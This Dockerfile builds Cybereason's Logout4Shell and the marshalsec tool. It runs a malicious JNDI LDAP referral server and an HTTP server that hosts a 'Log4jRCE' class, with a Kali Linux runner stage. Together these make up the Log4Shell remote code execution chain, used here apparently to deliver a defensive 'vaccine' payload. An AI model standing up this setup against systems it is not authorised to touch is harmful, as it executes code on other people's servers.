FROM ubuntu:21.04 as webserver-builder


RUN mkdir -p /opt/build_logout4shell
WORKDIR /opt/build_logout4shell
RUN apt-get update && apt-get install -y git default-jdk maven python3
RUN cd /opt/build_logout4shell && git clone https://github.com/cybereason/Logout4Shell.git && cd ./Logout4Shell && git checkout eee6cd3 && mvn package && ls ./target/classes
RUN cd /opt/build_logout4shell && git clone https://github.com/mbechler/marshalsec.git && cd ./marshalsec && git checkout f645788 && mvn clean package -DskipTests && ls ./target/classes



FROM ubuntu:21.04 as webserver
RUN apt-get update && apt-get install -y python3
RUN mkdir -p /opt/webserver/
COPY --from=webserver-builder /opt/build_logout4shell/Logout4Shell/target/classes/* /opt/webserver/
WORKDIR /opt/webserver
ENTRYPOINT ["python3", "-m", "http.server", "8888"] 


FROM ubuntu:21.04 as ldapserver
RUN apt-get update && apt-get install -y default-jdk
RUN mkdir -p /opt/webserver/
COPY --from=webserver-builder /opt/build_logout4shell/marshalsec/target/classes/* /opt/webserver/
WORKDIR /opt/webserver
ENTRYPOINT [ "java", "-cp", "marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", "'http://webserver:8888/#Log4jRCE'"] 


FROM kalilinux/kali:latest as runner
